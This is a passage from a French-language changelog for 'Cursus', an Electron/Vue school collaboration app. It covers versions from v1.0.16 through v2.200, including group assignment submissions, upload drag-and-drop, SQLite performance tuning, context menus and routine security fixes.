- **Photo de profil** (`SettingsAccount` + `LoginOverlay` register form) : l'avatar lui-meme devient drop-zone. Accept `image/*`, max 5 Mo. Lit via `FileReader` et set le data URI. Badge "Deposer ici" + halo accent au drag-over.
- **`StudentDepositForm`** refactore pour utiliser le composable (supprime ~30 lignes dupliquees).

## v2.200.0 (2026-04-20)

### UX depot etudiant

Deux frictions haute priorite identifiees lors de l'audit UX/UI devoirs etudiant, les deux susceptibles de causer des litiges au pilote CESI sept 2026.

- **Drag-and-drop sur la zone de depot** : on pouvait uniquement cliquer pour ouvrir le file picker. Desormais l'etudiant peut glisser un PDF/image/archive directement sur la zone. La zone affiche un etat actif ("Relacher pour deposer" + halo accent) pendant le hover. Limite 50 Mo respectee, fallback toast si `file.path` Electron indisponible.
- **Avertissement ecrasement depot de groupe** : v2.199 autorise n'importe quel membre a ecraser le depot de l'equipe sans signal. Un etudiant pouvait ecrabouiller le rendu d'un camarade par erreur. Desormais, une confirmation `useConfirm` apparait : *"Alice a deja depose projet-v1.pdf pour ce devoir de groupe. Votre fichier va le remplacer (la version precedente sera perdue)."* Bouton `Remplacer` (warning) + `Annuler`. Le depot solo et le depot groupe par le meme etudiant ne declenchent pas le prompt.

## v2.199.0 (2026-04-20)

### Devoirs de groupe — modele "un depot = toute l'equipe"

Refonte du workflow depot pour les devoirs de groupe, suite deep-interview `deep-interview-devoirs-groupe-depot-v1.md` (ambiguite finale 9%).

**Avant** : chaque membre d'un groupe devait redeposer son propre fichier. Alice rendait → Bob/Chloe/David voyaient "pas rendu" sur leur propre vue, le prof voyait 1/4. Bug serieux : `markNonSubmittedAsD` mettait D aux 3 membres dont le groupe avait pourtant rendu via Alice.

**Apres v2.199** : un seul depot represente le groupe. N'importe quel membre peut soumettre ou ecraser. Note et feedback partages entre tous. L'etudiant voit "Rendu par Alice" dans sa propre vue si un autre membre a soumis.

### Implementation

- **Migration DB v77** : `depots.group_id` + backfill + dedup (garde le depot le plus recent par (travail, groupe)) + index partial `idx_depots_group`.
- **Backend `addDepot`** : chemin groupe separe — SELECT existant par `(travail_id, group_id)` → UPDATE ou INSERT. `student_id` sur depot = dernier uploader (pas d'historique v1, conforme a la spec).
- **Backend `getStudentTravaux` + `getTravauxSuivi`** : le LEFT JOIN depots matche soit le depot individuel (s.id) soit le depot partage du groupe (group_id = t.group_id). Expose `depot_author_id` et `depot_author_name`.
- **Backend `markNonSubmittedAsD`** : pour un travail de groupe, insere au plus 1 D pour le groupe entier (pas 4 D sur les 4 membres). Skip si le groupe a deja rendu.
- **Frontend `StudentDevoirCard`** : affiche "Rendu par Alice" quand le depot est un depot de groupe soumis par un autre membre.
- **5 nouveaux tests** couvrent : creation de depot de groupe, ecrasement inter-membres, visibilite cross-membre (Chloe voit le depot de Bob), immunite de `markNonSubmittedAsD`, fallback D sur groupe sans depot.

### Hors scope v1

- Override note-par-membre (free-rider problem) → v2 si le retour terrain le demande.
- Feedback individuel differencie → meme feedback pour tous en v1.
- Historique de versions → ecrasement = perte de version precedente.
- Designation d'un leader / co-signature.

## v2.198.0 (2026-04-20)

### Fix

Les types CCTL, soutenance et etude de cas ne doivent jamais apparaitre comme "a rendre" ni "non rendu" — ce sont des evaluations en salle, pas des devoirs a deposer.

**5 sites avaient un check isEventType incomplet** (oubliaient `etude_de_cas`), causant l'apparition de ces examens dans la liste "A rendre" cote etudiant + les stats de pending :
- `useDevoirsTeacher.ts` (statut Complet calcule sur les soutenances)
- `StudentTimelineModal.vue` + `StudentProjetDevoirsList.vue` (filtre overdue/urgent)
- `useStudentProjetDevoirs.ts` (pending computed)
- `FriseCalendar.vue` (forme diamant dans le calendrier)

Tous migres vers `isEventType` centralise dans `utils/devoir.ts`.

### Defense en profondeur

- **Migration DB v76** : `UPDATE travaux SET requires_submission = 0 WHERE type IN ('cctl', 'soutenance', 'etude_de_cas')` — corrige les devoirs crees avant le fix auto du `NewDevoirModal`.
- **Backend `createTravail`** : force `requires_submission = 0` pour les types evenement peu importe ce que le client envoie.
- **`DevoirMetaSection` (modal gestion)** : le toggle "Requiert un depot", la progress bar "X/Y rendus" et le statut "Complet" sont masques pour les types evenement.

## v2.197.0 (2026-04-20)

### Bundle + perf

Suite de l'audit perf avec benchmark systematique avant shipping.

- **Cahiers collaboratifs desactives** (non utilises pour le pilote CESI 2026) : entree UI retiree de DocumentsView et des widgets dashboard (student + teacher). Composants, store et deps restent en place pour pouvoir reactiver sans migration. **DocumentsView : 1237 Ko -> 86 Ko** (-93%, TipTap + Yjs + Hocuspocus tree-shake).
- **highlight.js -> /lib/common** (36 langages courants au lieu de 190). HLJS_AUTO_SUBSET (shipped en v2.195.1) narrow deja a 11 langages, aucune regression fonctionnelle. **LumenView : 2134 Ko -> 945 Ko** (-55%). La fast path Lumen (lire un chapitre) est dramatiquement plus legere.
- **`loadReminders` dans `Promise.all`** (useDashboardTeacher) : fusionne l'IPC des rappels avec les 4 autres appels du batch initial du dashboard teacher. Economise 1 IPC round-trip sequentiel (~5-20 ms).

### Bundle total : 25 Mo -> 24 Mo

### Faux positifs confirmes par benchmark

- **Prepared statements caches au module-level** : mesure 3x plus rapide sur `.prepare()` (8.2us -> 2.7us) mais un dashboard complet n'execute que ~8 queries = 40us total, pas assez de ROI pour un refactor de 50+ fonctions.

## v2.196.1 (2026-04-20)

### Performance DB

Audit dedie de la base SQLite (better-sqlite3) — 2 safe wins de gros impact.

- **PRAGMAs tunes** dans `connection.js#applyPragmas` :
  - `synchronous = NORMAL` (combine avec WAL deja actif) : ~2-3x les writes. La DB reste coherente ; seul le tout-dernier commit peut etre perdu si l'OS crashe pendant un fsync — acceptable en Electron local.
  - `cache_size = -10000` (10 MB au lieu des 2 MB default) : plus de page churn sur les jointures messages/depots/students dans le dashboard prof.
  - `mmap_size = 30000000` (30 MB mappes) : evite les `read()` syscalls sur les hot tables.
- **`seedIfEmpty()` en transaction** : les ~200 INSERTs du seed initial passent de 200 fsync a 1 seul (~100 ms -> ~10 ms sur premier lancement ou reset).

### Notes d'audit

L'audit a liste des gains plus importants mais plus risques, laisses pour une release dediee :
- Subqueries correlees dans `getTravaux()` (3 `COUNT(*)` correles) — refactor en CTE (+40% dashboard prof).
- `messages.reactions` en TEXT JSON -> table `message_reactions` normalisee (agregats DB).
- `channels.members` JSON -> table `channel_members`.

## v2.196.0 (2026-04-20)

### Performance

Pass complet d'audit + optimisations ciblees sur le cold start, le bundle renderer et la couche DB.

- **Cold start** : le splash screen est peint **avant** `db.init()` — l'utilisateur voit un retour visuel immediat meme quand SQLite rejoue les migrations (500-1500 ms sur bump de version).
- **Bundle renderer** : `@marp-team/marp-core` (~1 MB) devient `await import()` dynamique dans `LumenSlideDeck` — plus embarque dans le bundle principal tant qu'un chapitre Marp n'est pas ouvert.
- **Modales async** : 18 modales passent en `defineAsyncComponent` (SettingsModal, NewDevoirModal, etc.). Chacune devient un chunk separe, charge au 1er usage. Economie ~400-800 Ko de JS parse au boot. Restent synchrones : `ConfirmModal`, `CmdPalette` (hot paths), `ChangePasswordModal` (1re connexion).
- **DB** : migration v75 ajoute `idx_travaux_channel ON travaux(channel_id)` — accelere `getTravaux(channelId)` et le TeacherProjectHome sur promos chargees (full scan -> index lookup).

### Notes d'audit

L'audit a aussi liste des recommandations plus lourdes (normaliser `channels.members` JSON en table dediee, reduire les `COUNT(*)` correles dans `getTeacherSchedule`, adopter `v-memo`/`shallowRef` dans MessageList). Elles sont laissees pour une release dediee car plus risquees.

## v2.195.1 (2026-04-20)

### Performance

- **Markdown reader** : highlightAuto restreint a 11 langages courants (au lieu des 190 charges par hljs). Gain >10x sur les blocs de code sans langue declaree (~590ms -> ~50ms), reglait un timeout du test `markdown.test.ts:151`.

### Cleanup

- Suppression de la dependance `vue-cal` (plus utilisee depuis la refonte grilles custom), du fichier `vue-cal.d.ts` et des commentaires residuels dans `stores/agenda.ts`, `useAgendaFilters.ts`, `useAgendaIcsExport.ts`, `AgendaMonthGrid.vue`, `AgendaTimeGrid.vue`.
- `useAgendaViewNav` : retrait des champs vestigiaux `calRef` et `onViewChange` (aucun appelant).

## v2.195.0 (2026-04-20)

### Merge main <- branche v2.188

Reconciliation des deux axes de travail paralleles autour de l'agenda et des menus contextuels.

- **Agenda** : adoption des grilles custom `AgendaMonthGrid` + `AgendaTimeGrid` (remplacent VueCal), avec conservation du persist localStorage de la vue active (`cc_agenda_view`) et de la barre de recherche avec raccourci `/`.
- **`useContextMenu`** : composable unifie supportant les deux patterns utilises dans le codebase :
  - **Mode items** (`const { state, open, close } = useContextMenu()`) : items passes directement a `open(ev, items)`.
  - **Mode target** (`const { ctx, open, close } = useContextMenu<T>()`) : la cible sert a calculer les items dans un `computed`.
- **`useAgendaViewNav`** : navigation prev/next par vue (mois/semaine/jour) + persistance localStorage de la vue active.
- **CSS AgendaView** : suppression des overrides VueCal (plus utilises).

## v2.188.0 (2026-04-20)

### Nouvelles fonctionnalites

- **Menus contextuels (clic droit)** sur 17 nouvelles zones + enrichissement du menu message :
  - Nouveau composable `useContextMenu<T>()` pour factoriser le pattern
  - `CahierList` : ouvrir, copier titre, renommer, supprimer
  - `AgendaDayNotes` : copier texte, supprimer
  - `ProjectListPanel` : copier nom, renommer, supprimer
  - `LumenOutline` : aller a la section, copier titre/ancre
  - `PinnedBanner` : aller au message, copier contenu, desepingler
  - `LumenChapterPickerModal` : lier, copier titre/chemin/repo
  - `IntervenantsModal` : gerer canaux, copier email/nom, mailto, supprimer
  - `ClasseModal` : profil, DM, copier nom/note
  - `WidgetNotationPending` : ouvrir rendus/devoir, copier titre
  - `WidgetAtRisk` : profil, DM, copier nom/score
  - `LumenRepoSidebar` : ouvrir chapitre, copier titre/chemin/lumen://, marquer lu
  - `SidebarFichiers` : voir fichiers, DM, filtrer images/docs, copier nom
  - `Leaderboard` : copier nom/score, DM, encourager
  - `MessageWall` : copier, aimer, masquer, supprimer, signaler
  - `LumenAnnotations` : copier passage/commentaire, modifier, supprimer
  - `BookingPage` : reserver, copier date/lien, ajouter a Google Calendar
  - `AccueilActivityTile` : ouvrir rendus/devoir, copier libelle
  - `MessageBubble` enrichi : copier lien/ID/auteur, mettre en signet, DM a l'auteur

## v2.2.3 (2026-03-29)

### Nouvelles fonctionnalites

- **DMs etudiant-etudiant** : les etudiants peuvent s'envoyer des messages directs au sein de leur promo
- **Queue offline** : les messages non envoyes sont stockes localement et re-envoyes a la reconnexion
- **Retry automatique** : 3 tentatives avec backoff exponentiel sur echec reseau
- **Archivage de canaux** : un responsable peut archiver un canal (invisible, lecture seule, restaurable)
- **Gestion des membres** : ajout/retrait d'etudiants dans les canaux prives depuis le panneau membres
- **Header de canal enrichi** : description, compteur de membres et badge type (Chat/Annonces)
- **Bouton admin SSO** : connexion automatique au panneau d'administration sans re-saisie de mot de passe
- **Validation fichiers upload** : taille max 50 Mo, extensions dangereuses bloquees, path traversal

### Corrections

- Page admin reservee aux administrateurs uniquement (plus les teachers)
- URL admin corrigee vers admin.cursus.school
- admin.cursus.school retournait "Non authentifie" au lieu du formulaire de login
- Lighthouse CI retire app.cursus.school (SPA avec login = NO_FCP)
- Type `authorType` dans la queue DM corrige (string literal union)
- Tests live routes alignes sur l'isolation promo (v2.1.6)

### Securite

- 17 routes securisees avec middleware isolation promo (live, rex, projects)
- Export REX reserve aux responsables (etait ouvert a tous)

### Robustesse

- Recherche DM limitee a 200 resultats (plus d'explosion memoire)
- Validation destinataire avant envoi de DM
- `safeStorage` integre dans useStudentReminders, usePrefs, documents store
- `depositValidation` integre dans useStudentDeposit avant chaque upload
- `safeAuthorType`/`safeUserType` centralises dans toutes les insertions DB

### Tests

- 60 tests canaux (archivage, membres, header, isReadonly)
- Tests DMs etudiant-etudiant (backend + frontend)
- Tests retry/queue (messages-retry.test.ts)
- Tests dmQueue, searchDmMessages limit, validation destinataire
- Tests channelMemberCount helper + app store archived

---

## v2.0.9 (2026-03-29)

### Nouvelles fonctionnalites

- Modules activables/desactivables depuis le panneau d'administration (audit securite inclus)
- Wizard d'onboarding pour les nouveaux utilisateurs
- Metriques d'adoption : DAU/WAU et alertes d'inactivite
- Les noms des executables incluent desormais le numero de version (Cursus-2.0.9-win.exe, etc.)
- La version de l'executable est synchronisee automatiquement depuis le tag git au moment du build CI

### Corrections

- Les documents de la promo CPIA2 etaient invisibles a cause d'une collision de noms de fonction entre deux modeles (`getProjectDocuments` duplique)
- Les administrateurs ne pouvaient pas envoyer de messages (contrainte CHECK `author_type` ne reconnaissait que `teacher` et `student`)
- Le mapping des types utilisateur est desormais centralise (`safeAuthorType`/`safeUserType`) pour eviter les crashs sur les roles `admin` et `ta`
- Bug critique corrige : le computed `roleLabel` dans les parametres du compte ecrasait l'import du meme nom, causant un TypeError au runtime
- L'ancien fichier de base de donnees `cesi-classroom.db` est automatiquement renomme en `cursus.db` au premier demarrage
- Onglet promotions vide et role/email manquants dans les parametres corriges
- Modale RGPD rendue conforme
- UX mise a jour des parametres amelioree (barre de progression, spinner, etats clairs)
- Securite DM renforcee, migration robuste, indexes ajoutes

### Ameliorations

- Renommage des labels de roles : Pilote devient **Responsable**, les labels sont centralises dans `ROLE_LABELS`
- Toutes les references a l'ancien nom `cesi-classroom` et `slack-like-electron` mises a jour vers `cursus`
- Landing page amelioree (SVGs inline, manifeste PWA, accessibilite clavier)
- Catch vides remplaces par `console.warn` dans le store principal

### Tests

- Tests de regression pour le mapping `author_type` (admin, ta, teacher, student)
- Tests unitaires pour `safeAuthorType` et `safeUserType`
- Tests d'integration : admin et TA peuvent envoyer des messages via l'API
- Suite de stabilite complete : 78 fichiers, 1017+ tests
- Couverture regression documents vides et fallback projet invalide

### Infrastructure

- `package-lock.json` synchronise avec `package.json` (version 2.0.4)
- CI : `npm version` injecte automatiquement la version du tag avant le build
- Noms d'artefacts dynamiques pour Windows, Mac et Linux

---

## v1.0.16 (2026-03-28)

### Corrections

- Les noms des membres du groupe s'affichent maintenant correctement pour les etudiants (l'API utilisee etait reservee aux enseignants)
- Le widget customizer met a jour les widgets immediatement sans recharger la page
- Les bookmarks s'affichent correctement dans le widget (mauvaise cle localStorage corrigee)

### Ameliorations

- Nouveau panneau de personnalisation des widgets : sections Actifs/Disponibles, drag-and-drop pour reordonner, toggles visuels
- 15+ casts `as any` supprimes, types precis ajoutes dans l'API IPC (getDmFiles, getEngagementScores, getTeacherNotes, getStudentProfile)
- Accessibilite : navigation clavier (Space/Enter) sur les boutons de widgets, aria-labels sur les widgets non-interactifs, role=tablist sur le dashboard
- Sections collapsibles de la sidebar accessibles au clavier (Enter/Space + aria-expanded)
- Recherche debounced dans l'historique Quiz et REX (nouveau composable `useDebounce`)
- Couleurs de notes unifiees entre dashboard etudiant et analytique enseignant
- Cles localStorage centralisees dans `STORAGE_KEYS` (bookmarks, quicklinks, remember_token)
- `.sa-empty` deduplique dans un CSS partage au lieu de 7 copies
- `numericGradeClass()` et `gradeColor()` extraits dans `utils/grade.ts`
- Performances : WidgetGroupMembers passe de N³ appels API a 3 requetes, WidgetRecentDoc optimise (reduce au lieu de sort)

### Tests

- 21 nouveaux tests : `grade.test.ts` (15) + `useDebounce.test.ts` (6)
- Total frontend : 12 fichiers, 149 tests, 100% pass

### Infrastructure

- Configuration Playwright E2E prete (playwright.config.ts, tests/e2e/auth.spec.ts)
- Agent distant programme toutes les heures pour ameliorer la qualite du code et la securite
- Scripts `test:e2e` et `test:e2e:ui` ajoutes

---

## v1.0.13 et avant

Voir l'historique git pour les versions precedentes.
